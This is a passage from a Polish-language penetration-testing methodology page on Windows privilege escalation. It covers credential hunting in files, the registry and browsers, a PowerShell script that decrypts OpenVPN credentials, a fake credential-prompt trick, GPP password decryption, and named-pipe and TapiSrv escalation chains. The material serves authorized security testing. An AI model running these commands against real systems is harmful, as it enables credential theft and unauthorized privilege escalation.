Oddzielny plik `Openfire\conf\openfire.xml` może ujawniać skonfigurowane porty i interfejs powiązania konsoli administracyjnej, nawet gdy używana jest zewnętrzna baza danych. Openfire zwykle wiąże konsolę administracyjną z loopback; lokalne konto nadal może połączyć się z tym adresem, jeśli nasłuchujący port działa. Łącznie sprawdź faktyczny nasłuchujący port, rolę autoryzowanego administratora, zasady przesyłania wtyczek i tożsamość usługi Openfire. Administrator, który może zainstalować wtyczkę, może doprowadzić do uruchomienia jej kodu w kontekście usługi, co może oznaczać wysokie uprawnienia, jeśli usługa działa jako LocalSystem. Zgodne hasło konta ani czytelna ścieżka do konfiguracji nie dowodzą same w sobie dostępu do konsoli administracyjnej ani możliwości wykonania kodu. Zobacz [przewodnik dostawcy po instalacji i zarządzaniu wtyczkami](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) oraz [właściwość API przesyłania wtyczek](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguracja serwera do zarządzania kryminalistycznego

Konfiguracje serwera Velociraptor, zwykle o nazwie `server.config.yaml`, mogą zawierać `CA.private_key` wewnętrznego CA. Jeśli użytkownik o niższych uprawnieniach może odczytać ten klucz, może być w stanie wystawić certyfikat klienta API. To, czy prowadzi to do wyższych uprawnień, zależy od ról użytkowników na serwerze, dostępności API i tożsamości, w której działa serwer lub agent docelowy. Konfiguracja klienta zawiera inne dane; jej znalezienie nie oznacza dostępu do CA serwera. W niektórych wdrożeniach prywatny klucz CA jest przechowywany offline, więc czytelna konfiguracja serwera może nie zawierać klucza podpisującego.

Na serwerze Windows sprawdź ACL **konfiguracji serwera** w katalogu instalacyjnym oraz wszelkich chronionych kopii zapasowych. Jedną z możliwych lokalizacji jest `%ProgramFiles%\VelociraptorServer\server.config.yaml`; jeśli ścieżka skonfigurowana dla usługi jest inna, użyj jej. Potwierdź, że bieżąca tożsamość może odczytać plik i że faktycznie znajduje się w nim `CA.private_key`. Nie umieszczaj klucza prywatnego w logach ani wynikach enumeracji. Przepływ `config api_client` dostawcy używa klucza CA do wystawienia certyfikatu klienta, ale wymagane są również odpowiednie uprawnienia po stronie serwera; ich utworzenie lub zmiana może wymagać dostępu do zapisu w magazynie danych albo ponownego uruchomienia. Istniejąca uprzywilejowana tożsamość serwera może zapewnić dostęp nawet wtedy, gdy taki zapis nie jest możliwy. Zapytania API z uprawnieniami do wykonywania operacji działają w odpowiednim kontekście serwera lub agenta, który może mieć wysokie uprawnienia.

Zabezpiecz konfigurację serwera i kopie zapasowe restrykcyjnymi ACL, w miarę możliwości przechowuj klucz podpisujący CA offline oraz ogranicz role API i dostęp do nasłuchujących portów. Zobacz [dokumentację API Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) i [wskazówki dotyczące konfiguracji zabezpieczeń](https://docs.velociraptor.app/docs/deployment/security/).

### Dane uwierzytelniające PuTTY

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY to oddzielny menedżer sesji. Jego natywny zaszyfrowany magazyn może znajdować się w `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, natomiast wyeksportowana kopia zapasowa sesji może nosić nazwę `sessions-backup.dat` i być przechowywana w innym miejscu. [Przewodnik SolarWinds dotyczący eksportu](https://thwack.solarwinds.com/discussion/comment/115591) informuje, że eksporty są szyfrowane hasłem i mogą zawierać sesje, klucze, skrypty, tagi oraz powiązania; na [forum pomocy technicznej](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) wskazano natywny magazyn. Najpierw sprawdź uprawnienia do plików i ścieżki. Znalezienie któregokolwiek z tych plików nie ujawnia jego hasła ani nie dowodzi, że zapisane poświadczenia są nadal ważne lub zapewniają wyższe uprawnienia.

### Klucze hostów SSH PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Klucze SSH w rejestrze

Klucze prywatne SSH mogą być przechowywane w kluczu rejestru `HKCU\Software\OpenSSH\Agent\Keys`, więc sprawdź, czy znajduje się tam coś interesującego:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Jeśli znajdziesz w tej ścieżce jakikolwiek wpis, prawdopodobnie będzie to zapisany klucz SSH. Jest przechowywany w postaci zaszyfrowanej, ale można go łatwo odszyfrować za pomocą [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Więcej informacji o tej technice: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Jeśli usługa `ssh-agent` nie jest uruchomiona, a chcesz, aby uruchamiała się automatycznie podczas rozruchu, wykonaj:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Wygląda na to, że ta technika nie jest już skuteczna. Próbowałem utworzyć klucze SSH, dodać je za pomocą `ssh-add` i zalogować się przez SSH na maszynę. Rejestr HKCU\Software\OpenSSH\Agent\Keys nie istnieje, a procmon nie wykrył użycia `dpapi.dll` podczas uwierzytelniania kluczem asymetrycznym.

### Pliki instalacji nienadzorowanej

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Możesz również wyszukać te pliki za pomocą **metasploit**: _post/windows/gather/enum_unattend_

Przykładowa zawartość:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Kopie zapasowe SAM i SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Czytelne pliki kopii zapasowych Windows Imaging (`.wim`) mogą również zawierać offline’owe gałęzie rejestru `SAM`, `SECURITY` i `SYSTEM`. W pierwszej kolejności sprawdź lokalnie dostępne katalogi kopii zapasowych lub obrazów i przed wypakowaniem czegokolwiek przejrzyj **nazwy elementów** obrazu; sama nazwa pliku `.wim` nie dowodzi, że zawiera on gałęzie rejestru, a standardowe obrazy `install.wim`, `boot.wim` i obrazy odzyskiwania często prowadzą do fałszywych tropów. Udział SMB to odrębna ścieżka dostępu i należy go sprawdzać tylko wtedy, gdy ten udział jest objęty zakresem. Zobacz wskazówki Microsoftu dotyczące [obrazów systemu Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) oraz [plików gałęzi rejestru](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Poświadczenia w chmurze

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Wyszukaj plik o nazwie **SiteList.xml**

### Hasło GPP zapisane w pamięci podręcznej

Dostępna była wcześniej funkcja umożliwiająca wdrażanie niestandardowych lokalnych kont administratora na grupie komputerów za pomocą Group Policy Preferences (GPP). Ta metoda miała jednak poważne wady związane z bezpieczeństwem. Po pierwsze, obiekty zasad grupy (GPO), przechowywane jako pliki XML w SYSVOL, były dostępne dla każdego użytkownika domeny. Po drugie, hasła w tych plikach GPP, szyfrowane algorytmem AES256 z użyciem publicznie udokumentowanego klucza domyślnego, mogły zostać odszyfrowane przez każdego uwierzytelnionego użytkownika. Stanowiło to poważne zagrożenie, ponieważ mogło umożliwić użytkownikom uzyskanie podwyższonych uprawnień.

Aby ograniczyć to zagrożenie, opracowano funkcję skanującą lokalnie zapisane w pamięci podręcznej pliki GPP w poszukiwaniu niepustego pola „cpassword”. Po znalezieniu takiego pliku funkcja odszyfrowuje hasło i zwraca niestandardowy obiekt PowerShell. Obiekt zawiera szczegółowe informacje o GPP i lokalizacji pliku, co pomaga zidentyfikować tę lukę w zabezpieczeniach i ją usunąć.

Wyszukaj te pliki w `C:\ProgramData\Microsoft\Group Policy\history` lub w _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (przed Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Aby odszyfrować cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Użycie crackmapexec do uzyskania haseł:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### Konfiguracja Web IIS

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Przykład pliku web.config z danymi uwierzytelniającymi:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Archiwa kopii zapasowych w katalogu webroot IIS

Stare archiwum ZIP z kopią zapasową umieszczone bezpośrednio w katalogu webroot obsługiwanym przez serwer może ujawnić wcześniejsze pliki konfiguracyjne i możliwe do ponownego wykorzystania dane uwierzytelniające. Sprawdź skonfigurowaną fizyczną ścieżkę witryny i to, czy archiwum jest faktycznie dostępne przez HTTP, zanim uznasz to za ujawnienie. Domyślna ścieżka `C:\inetpub\wwwroot` to tylko jedna z możliwości. Szybka lokalna inwentaryzacja może wyświetlić nazwy i rozmiary plików bez otwierania archiwów:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Nazwa archiwum nie dowodzi, że zawiera ono sekret ani że odzyskane dane uwierzytelniające zapewniają wyższe uprawnienia.

### Dane uwierzytelniające OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Dzienniki

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Poproś o dane logowania

Zawsze możesz **poprosić użytkownika o podanie jego danych logowania, a nawet danych logowania innego użytkownika**, jeśli sądzisz, że może je znać (zauważ, że bezpośrednie **poproszenie klienta o dane logowania** jest naprawdę **ryzykowne**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Możliwe nazwy plików zawierających dane uwierzytelniające**

Znane pliki, które jakiś czas temu zawierały **hasła** w **postaci jawnego tekstu** lub Base64

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Bazy danych Password Safe v3 często używają rozszerzenia `.psafe3`. Traktuj plik o pasującej nazwie jako potencjalny zaszyfrowany sejf; sama jego obecność nie oznacza, że możesz go odczytać, odblokować ani użyć zapisanych w nim poświadczeń. Podczas sprawdzania lokalizacji takich plików przejrzyj dostępne profile użytkowników i skonfigurowane katalogi główne udziałów plików.

Czytelny plik KeePass `.kdbx` również jest jedynie wskazówką prowadzącą do zaszyfrowanego sejfu. Do jego odblokowania potrzebne jest właściwe hasło główne oraz każdy skonfigurowany plik klucza lub dodatkowy czynnik konta. Jeśli autoryzowany przegląd wykryje w jednym z wpisów parę hashy LM:NT, zweryfikuj wskazane konto oraz to, czy hash NT jest aktualny i akceptowany przez usługę NTLM celu, zanim rozważysz [pass-the-hash](../ntlm/README.md#pass-the-hash). Sam wpis w sejfie nie zapewnia uprawnień Administratora ani SYSTEM; dostęp do usługi zdalnej, uprawnienia konta i ewentualny odrębny krok uruchomienia usługi również muszą być dostępne. Inwentaryzacja powinna podawać ścieżkę sejfu i informację o możliwości jego odczytu, a nie wyświetlać bazy danych ani zapisanych poświadczeń.

Przeszukaj wszystkie proponowane pliki:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Dane uwierzytelniające w Koszu

Sprawdź dostępne elementy Kosza pod kątem usuniętych kopii zapasowych i archiwów konfiguracji, a także plików, których nazwy wprost wskazują na dane uwierzytelniające. Przydatna kopia `.7z`, `.zip` lub `.rar` może mieć kilka miesięcy i zwyczajną nazwę. Windows przechowuje pierwotną ścieżkę i czas usunięcia w rekordzie `$I`, a usunięty plik jako powiązany wpis `$R`; przed otwarciem archiwum sprawdź metadane i uprawnienia bieżącej tożsamości do odczytu. Widoczność zależy od woluminu, SID użytkownika i uprawnień do pliku, więc pusta lista nie dowodzi, że nie ma kopii zapasowej, którą można odzyskać. Traktuj nazwę archiwum jako wskazówkę do sprawdzenia, a nie dowód, że zawiera ono prawidłowy sekret.

Dostępny usunięty plik `.pfx` może też być wskazówką dotyczącą **podpisywania kodu**. Jeśli zawiera dostępny klucz prywatny, można nim podpisać zmieniony skrypt PowerShell; [PowerShell wymaga certyfikatu do podpisywania kodu z kluczem prywatnym](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), a [reguły wydawcy AppLocker sprawdzają tożsamość podpisującego i zakres reguły](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Wykonanie między kontami wymaga, by bieżąca tożsamość mogła zmodyfikować konkretny skrypt, obowiązująca reguła akceptowała jego wynikowy podpis dla tego skryptu i konta docelowego, a zadanie harmonogramu lub inny proces o wyższych uprawnieniach faktycznie go uruchamiał. Sama nazwa pliku `.pfx`, podmiot certyfikatu ani możliwość zapisu do skryptu nie potwierdzają istnienia całego łańcucha. Przed otwarciem materiału zawierającego klucz prywatny lub uruchomieniem zadania sprawdź metadane, ACL, zasady i polecenie zadania.

Sprawdź też dostępne bazy danych profili klientów komunikacyjnych, notatki i otrzymane pliki pod kątem wskazówek dotyczących danych uwierzytelniających. Eksport klucza odzyskiwania BitLocker może być zapisany jako HTML lub TXT, czasem wewnątrz archiwum kopii zapasowej o opisowej nazwie. Takie materiały mogą zapewnić dostęp do osobnego zaszyfrowanego woluminu danych zawierającego starsze kopie zapasowe; sprawdzaj wolumin i archiwum tylko wtedy, gdy masz do tego uprawnienia. Jeśli kopia zapasowa zawiera `NTDS.dit`, odzyskanie poświadczeń domenowych offline wymaga również pasującego pliku hive `SYSTEM`, zgodnie z opisem w [procedurze tworzenia kopii zapasowych i pracy z grupami uprzywilejowanymi](../active-directory-methodology/privileged-groups-and-token-privileges.md). Same nazwy plików ani zablokowany wolumin nie dowodzą, że istnieje użyteczny klucz odzyskiwania lub kopia zapasowa domeny.

Aby **odzyskać hasła** zapisane przez różne programy, możesz użyć: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### W rejestrze

**Inne możliwe klucze rejestru zawierające dane uwierzytelniające**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Wyodrębnianie kluczy OpenSSH z rejestru.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia przeglądania

Sprawdź bazy danych, w których przechowywane są hasła z **Chrome, Edge lub Firefox**.\
Sprawdź też historię, zakładki i ulubione w przeglądarkach, ponieważ mogą być tam zapisane **hasła**.

W przypadku standardowego profilu Edge **Default** bieżącego użytkownika plik `Login Data` znajduje się w `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, a plik `Local State` w nadrzędnym katalogu `User Data`. [Microsoft opisuje domyślną lokalizację profilu](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); inny profil lub zasada `UserDataDir` mogą zmienić tę lokalizację. Sama obecność pliku wskazuje jedynie na możliwy magazyn poświadczeń: sprawdź, czy pliki są czytelne, czy masz dostęp do kontekstu DPAPI odpowiedniego użytkownika lub innych autoryzowanych materiałów klucza oraz czy zapisany login należy do konta o wyższych uprawnieniach. Samo wyszukiwanie ścieżek nie wymaga otwierania bazy danych ani wyświetlania odszyfrowanych haseł.

W przypadku Firefoksa [Mozilla opisuje](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), że pliki `key4.db` i `logins.json` w profilu zawierają odpowiednio klucz i zaszyfrowane loginy. Ich obecność wskazuje jedynie na możliwy trop: przed stwierdzeniem, że poświadczenia są użyteczne, sprawdź, czy oba pliki są czytelne, czy zawierają zapisane wpisy i czy klucz jest chroniony hasłem głównym (Primary Password). Jeśli odzyskane poświadczenie należy do konta domenowego, osobno sprawdź efektywne uprawnienia tego konta do zarządzania grupami oraz [uprawnienia grupy do odczytu lub odszyfrowywania haseł LAPS](../active-directory-methodology/laps.md); same artefakty przeglądarki nie dowodzą istnienia ścieżki do uprawnień administratora.

Narzędzia do wyodrębniania haseł z przeglądarek:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** to technologia wbudowana w system operacyjny Windows, która umożliwia **komunikację** między komponentami oprogramowania napisanymi w różnych językach. Każdy komponent COM jest **identyfikowany za pomocą identyfikatora klasy (CLSID)**, a jego funkcje są udostępniane przez jeden lub więcej interfejsów, identyfikowanych za pomocą identyfikatorów interfejsów (IID).

Klasy i interfejsy COM są zdefiniowane odpowiednio w rejestrze pod kluczami **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface**. Ten rejestr powstaje przez połączenie **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Wśród identyfikatorów CLSID tego rejestru można znaleźć podrzędny klucz **InProcServer32**, który zawiera **wartość domyślną** wskazującą na **DLL** oraz wartość o nazwie **ThreadingModel**, która może przyjmować wartość **Apartment** (jednowątkowy), **Free** (wielowątkowy), **Both** (jedno- lub wielowątkowy) albo **Neutral** (niezależny od wątków).

![Historia przeglądania — COM DLL Overwriting: Wśród identyfikatorów CLSID tego rejestru można znaleźć podrzędny klucz InProcServer32, który zawiera wartość domyślną wskazującą na DLL oraz wartość...](<../../images/image (729).png>)

Zasadniczo, jeśli możesz **nadpisać którąkolwiek z uruchamianych bibliotek DLL**, możesz **eskalować uprawnienia**, jeśli dana biblioteka DLL zostanie uruchomiona przez innego użytkownika.

Aby dowiedzieć się, jak atakujący wykorzystują COM Hijacking jako mechanizm utrzymywania dostępu, sprawdź:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Ogólne wyszukiwanie haseł w plikach i rejestrze**

**Wyszukiwanie treści plików**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Wyszukiwanie pliku o określonej nazwie**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Przeszukaj rejestr w poszukiwaniu nazw kluczy i haseł**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Narzędzia wyszukujące hasła

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **to plugin msf**. Stworzyłem go, aby **automatycznie uruchamiał każdy moduł POST Metasploit wyszukujący dane uwierzytelniające** na ofierze.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatycznie wyszukuje wszystkie pliki zawierające hasła wymienione na tej stronie.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) to kolejne świetne narzędzie do wyodrębniania haseł z systemu.

Narzędzie [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) wyszukuje **sesje**, **nazwy użytkowników** i **hasła** kilku narzędzi, które zapisują te dane w postaci zwykłego tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Ujawnione uchwyty

Wyobraź sobie, że **proces działający jako SYSTEM otwiera nowy proces** (`OpenProcess()`) z **pełnym dostępem**. Ten sam proces **tworzy również nowy proces** (`CreateProcess()`) **z niskimi uprawnieniami, który dziedziczy wszystkie otwarte uchwyty procesu nadrzędnego**.\
Następnie, jeśli masz **pełny dostęp do procesu o niskich uprawnieniach**, możesz przejąć **otwarty uchwyt do uprzywilejowanego procesu utworzonego** za pomocą `OpenProcess()` i **wstrzyknąć shellcode**.\
[Przeczytaj ten przykład, aby dowiedzieć się więcej o **wykrywaniu i wykorzystywaniu tej podatności**.](leaked-handle-exploitation.md)\
[Przeczytaj też **ten wpis, zawierający dokładniejsze wyjaśnienie, jak testować i nadużywać innych otwartych uchwytów procesów i wątków dziedziczonych z różnymi poziomami uprawnień (nie tylko pełnym dostępem)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segmenty pamięci współdzielonej, nazywane **potokami**, umożliwiają komunikację między procesami i przesyłanie danych.

Windows udostępnia funkcję **Named Pipes**, która pozwala niepowiązanym procesom współdzielić dane, nawet za pośrednictwem różnych sieci. Przypomina to architekturę klient/serwer, w której role określa się jako **serwer named pipe** i **klient named pipe**.

Gdy **klient** wysyła dane przez potok, **serwer**, który go utworzył, może **przejąć tożsamość** **klienta**, jeśli ma wymagane uprawnienie **SeImpersonate**. Znalezienie **uprzywilejowanego procesu**, który komunikuje się przez potok, który możesz podszyć, daje możliwość **uzyskania wyższych uprawnień** przez przyjęcie tożsamości tego procesu, gdy wejdzie w interakcję z utworzonym przez Ciebie potokiem. Instrukcje przeprowadzenia takiego ataku znajdziesz [**tutaj**](named-pipe-client-impersonation.md) i [**tutaj**](#from-high-integrity-to-system).

Poniższe narzędzie pozwala również **przechwytywać komunikację przez named pipe za pomocą narzędzia takiego jak Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **, a to narzędzie pozwala wyświetlić listę wszystkich potoków i je przeglądać, aby znaleźć możliwości eskalacji uprawnień** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Usługa Telephony (TapiSrv) w trybie serwera udostępnia `\\pipe\\tapsrv` (MS-TRP). Uwierzytelniony klient zdalny może wykorzystać asynchroniczną ścieżkę zdarzeń opartą na mailslotach, aby zmienić `ClientAttach` w dowolny **zapis 4 bajtów** do istniejącego pliku, do którego zapis ma `NETWORK SERVICE`, a następnie uzyskać uprawnienia administratora Telephony i załadować dowolną bibliotekę DLL jako usługa. Pełny przebieg:

- Wywołaj `ClientAttach`, ustawiając `pszDomainUser` na istniejącą ścieżkę, do której można zapisywać → usługa otwiera ją przez `CreateFileW(..., OPEN_EXISTING)` i używa do asynchronicznego zapisu zdarzeń.
- Każde zdarzenie zapisuje kontrolowany przez atakującego `InitContext` z `Initialize` do tego uchwytu. Zarejestruj aplikację line za pomocą `LRegisterRequestRecipient` (`Req_Func 61`), wywołaj `TRequestMakeCall` (`Req_Func 121`), pobierz dane przez `GetAsyncEvents` (`Req_Func 0`), a następnie wyrejestruj ją lub zamknij, by powtórzyć deterministyczne zapisy.
- Dodaj siebie do `[TapiAdministrators]` w `C:\Windows\TAPI\tsec.ini`, połącz się ponownie, a następnie wywołaj `GetUIDllName` z dowolną ścieżką do DLL, aby uruchomić `TSPI_providerUIIdentify` jako `NETWORK SERVICE`.

Więcej informacji:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Różne

### Rozszerzenia plików, które mogą uruchamiać kod w Windows

Zajrzyj na stronę **[https://filesec.io/](https://filesec.io/)**

### Nadużywanie protocol handler / ShellExecute za pośrednictwem rendererów Markdown

Klikalne linki Markdown przekazane do `ShellExecuteExW` mogą uruchamiać niebezpieczne URI handlery (`file:`, `ms-appinstaller:` lub dowolny zarejestrowany schemat) i wykonywać pliki kontrolowane przez atakującego jako bieżący użytkownik. Zobacz:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitorowanie wierszy poleceń w poszukiwaniu haseł**

